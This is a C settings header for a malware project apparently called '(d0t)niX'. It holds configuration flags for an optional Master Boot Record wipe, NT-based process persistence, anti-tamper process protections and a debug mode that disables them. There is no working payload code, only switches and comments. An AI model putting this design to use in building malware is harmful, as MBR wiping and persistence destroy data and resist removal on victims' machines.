/*-----------------------------------------------------+-------------------------\
 |    ___    __________   __  ___          ______  ___ |   ___________           |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / |  /   _____/  |_  ____   |
 |  /  / / __ | /  / \  \   __\\  \ /    \|  |\     /  |  \_____  \   __\/ ___\  |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  |  /        \  | / /_/  > |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ | /_______  /__| \___  /  |
 |   \__\    \/        \/     /__/      \/         \_/ |         \/    /_____/   |
 +-----------------------------------------------+-----+-------------------------/
 | settings.h :: (d0t)niX's settings Header File |
 \-----------------------------------------------*/                   #pragma once

// Warning Message: //
#define WARNING 1
	// If TRUE: Shows the user a warning message that he is about to execute Malware.
	//          ( IT IS NOT RECOMMENDED TO DISABLE THIS FEATURE ! )
	// Default: TRUE

// Kill MasterBootRecord: //
#define KILL_MBR 0
	// If TRUE: Kills the MBR (MasterBootRecord) by overwriting it (with Zeros)
	//          (Optional) ((I might write my own MBR displaying a Message))
	// Default: FALSE

//// Debug-Mode: ////
#define DEBUG 0
	// If TRUE: Allows you to disables security features, used by the Malware to prevent the user from tampering with it.
	//          Also allows you to enable certain debugging features.
	//          This will also be automatically definded if you set the VSBuild-Configuration to "Debug",
	//          this is just here so you can still enable Debug-Mode manually in the Release Configuration.
	// Default: FALSE

//// Debug Options: ////
#if (defined(_DEBUG)) || (DEBUG == TRUE)
	// Debug MessageBoxes: //
	#define DEBUG_MSG 1
		// If TRUE: Shows the user Error/Warning/Information/(Question) MessageBoxes used for debbuging.
		// Default: TRUE

	// Debug MessageBoxes Modal: //
	#define DEBUG_MSG_FORCE_MODAL 0
		// If TRUE: Forces the MessagesBoxes to be Systemmodal
		// Default: FALSE

	// NT Process Persistency: //
	#define NT_FUNCTIONS 0
		// If TRUE: Enables the Malware to use the NT Functions used for Process Persistency.
		// Default:	FALSE

	// Process Protections: //
	#define PROTECTIONS 0
		// If TRUE: Enable all "external" Process protections
		//          (this will control more in the future when features like active process monitoring are getting implemented)
		// Default: FALSE

	// Mutex/Semaphore utilization: //
	#define SYNCHRONIZATION 1
		// If TRUE: Enables the usage of a Global Mutex/Semaphore Object
		//          (It is not recommended to disable this feature, but it might be sometimes necessary for debugging purposes)
		// Default: TRUE

#elif defined(_RELEASE)
	// Default Release settings ( DO NOT EDIT ) //
	#define DEBUG_MSG 0
	#define DEBUG_MSG_FORCE_MODAL 0
	#define NT_FUNCTIONS 1
	#define PROTECTIONS 1
	#define SYNCHRONIZATION 1
#endif